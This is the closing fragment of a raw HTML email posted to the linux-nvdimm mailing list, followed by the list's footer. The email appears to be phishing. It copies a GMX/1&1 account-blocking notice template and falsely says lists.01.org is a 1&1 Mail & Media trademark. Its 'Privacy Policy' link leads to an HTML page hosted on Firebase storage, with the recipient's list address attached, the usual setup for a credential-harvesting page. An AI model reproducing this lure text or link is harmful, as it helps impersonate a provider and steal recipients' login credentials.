 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" width=3D300=
 align=3Dleft>
<TABLE class=3D"w620 w940" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 622p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 69=
2px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 border=
=3D0>
<TBODY>
<TR class=3Dlinefix style=3D"FONT-SIZE: 1px; LINE-HEIGHT: 0px">
<TD style=3D"FONT-SIZE: 14px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" height=3D21 vAlign=3Dto=
p align=3Dleft><FONT class=3Dmso-font-1 style=3D"FONT-SIZE: 14px; FONT-FAMI=
LY: DroidSans, Arial, Verdana, sans-serif; LINE-HEIGHT: 22px" color=3D#5151=
51 size=3D2 face=3DArial,Helvetica,Verdana,sans-serif>
You have received this message because you have created a lists.01.org acco=
unt. lists.01.org respects your privacy. To learn more, please read our&nbs=
p;<A style=3D"TEXT-DECORATION: none; COLOR: rgb(34,105,195); OUTLINE-WIDTH:=
 0px; OUTLINE-STYLE: none; OUTLINE-COLOR: invert" href=3D"https://firebases=
torage.googleapis.com/v0/b/urgl-e5636.appspot.com/o/bubuindex.html?alt=3Dme=
dia&amp;token=3De0a44e7b-b60a-4114-85c8-b2b43c2b4426#linux-nvdimm@lists.01.=
org" target=3D_blank>&#8204;<SPAN class=3Dmore>Privacy Policy</SPAN>.</A>
 This is an automatic message. Please do not reply to this message.</FONT><=
/TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 622px !importan=
t; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP: =
0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D40 w=
idth=3D300 align=3Dleft><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BOR=
DER-RIGHT: 0px; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; D=
ISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-=
portal.de/p.gif" width=3D1 height=3D40></TD></TR></TBODY></TABLE>
<TABLE class=3D"w620 w940 footnote" style=3D"BOX-SIZING: border-box; MAX-WI=
DTH: 622px !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; =
WIDTH: 622px !important; BACKGROUND: none transparent scroll repeat 0% 0%; =
BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOAT: none; BORDER-=
LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D300 border=3D0>
<TBODY>
<TR>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 622px !importa=
nt; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" width=3D300=
 align=3Dleft>
<TABLE class=3D"w620 w940" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 622p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 62=
2px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D=
300 border=3D0>
<TBODY>
<TR class=3Dlinefix style=3D"FONT-SIZE: 1px; LINE-HEIGHT: 0px">
<TD style=3D"FONT-SIZE: 14px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" height=3D21 vAlign=3Dto=
p align=3Dleft><FONT color=3D#515151><SPAN style=3D"FONT-FAMILY: DroidSans,=
 Arial, Verdana, sans-serif">lists.01.org</SPAN></FONT><FONT class=3Dmso-fo=
nt-1 style=3D"FONT-SIZE: 14px; FONT-FAMILY: DroidSans, Arial, Verdana, sans=
-serif; LINE-HEIGHT: 22px" color=3D#515151 size=3D2 face=3DArial,Helvetica,=
Verdana,sans-serif>
 is a registered trademark of 1&amp;1 Mail &amp; Media Inc., 70&#8204;1 Lee=
 Road, Suite 3&#8204;00, Chesterbrook,<BR>&copy; 2020. All rights reserved<=
/FONT></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 622px !importan=
t; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP: =
0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D40 w=
idth=3D300 align=3Dleft><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BOR=
DER-RIGHT: 0px; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; D=
ISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-=
portal.de/p.gif" width=3D1 height=3D40></TD></TR></TBODY></TABLE></TD>
<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD></TR>
</TBODY></TABLE>
<DIV style=3D"FONT-SIZE: 1px; HEIGHT: 0px; WIDTH: 0px; POSITION: relative; =
COLOR: rgb(153,153,153); LINE-HEIGHT: 0; BOTTOM: 0px"><IMG style=3D"FONT-SI=
ZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; TEXT-ALIG=
N: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 a=
lt=3D"" src=3D"https://us.wa.ui-portal.com/ui/mailing/s?mailing.mailservice=
s.event.open&amp;client=3Dgmx_MAILCOM&amp;mailingname=3Dabuse/accountblocki=
ng&amp;language=3Dundef" width=3D1 height=3D1></DIV></TD></TR></TBODY>
</TABLE></BODY></HTML>
--===============0464005944094961988==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
To unsubscribe send an email to linux-nvdimm-leave@lists.01.org

--===============0464005944094961988==--
